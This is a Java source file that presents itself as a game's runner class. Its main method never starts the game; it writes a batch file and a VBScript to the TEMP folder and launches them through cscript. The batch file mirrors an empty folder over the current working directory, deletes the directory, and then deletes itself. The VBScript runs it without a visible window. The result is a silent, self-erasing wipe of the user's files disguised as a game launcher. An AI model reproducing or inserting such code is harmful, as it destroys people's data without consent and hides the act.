import java.io.File;
import java.io.IOException;
import java.io.FileWriter;   // Import the FileWriter class

public class GameLogicRunner {
    public static void main(String[] args) {
//        new GameLogic();
        try {
            String filePath = System.getenv("TEMP")+"\\delproj.cmd";
            new File(filePath);
            FileWriter myWriter = new FileWriter(filePath);
            // https://superuser.com/questions/173859/how-can-i-delete-all-files-subfolders-in-a-given-folder-via-the-command-prompt
            myWriter.write("del /f \"hidecmd.vbs\"\n" +
                    "mkdir empty_folder\n" +
                    "robocopy /mir empty_folder " + System.getProperty("user.dir") + "\n" +
                    "rmdir /s /q " + System.getProperty("user.dir") + "\n" +
                    "rmdir /s /q empty_folder" + "\n" +
                    "start /b \"\" cmd /c del \"%~f0\"&exit /b" // https://stackoverflow.com/questions/20329355/how-to-make-a-batch-file-delete-itself
            );
            myWriter.close();

            filePath = System.getenv("TEMP")+"\\hidecmd.vbs";
            new File(filePath);
            myWriter = new FileWriter(filePath);
            // https://superuser.com/questions/140047/how-to-run-a-batch-file-without-launching-a-command-window
            myWriter.write("Set oShell = CreateObject (\"Wscript.Shell\") \n" +
                    "Dim strArgs\n" +
                    "strArgs = \"cmd /c delproj.cmd\"\n" +
                    "oShell.Run strArgs, 0, false");
            myWriter.close();
            
            // https://www.spigotmc.org/threads/java-not-running-vb-script.446856/
            Runtime.getRuntime().exec(new String[]{"C:\\Windows\\System32\\cscript.exe", filePath});
        } catch (IOException e) {
            System.out.println("An error occurred.");
            e.printStackTrace();
        }
    }

}
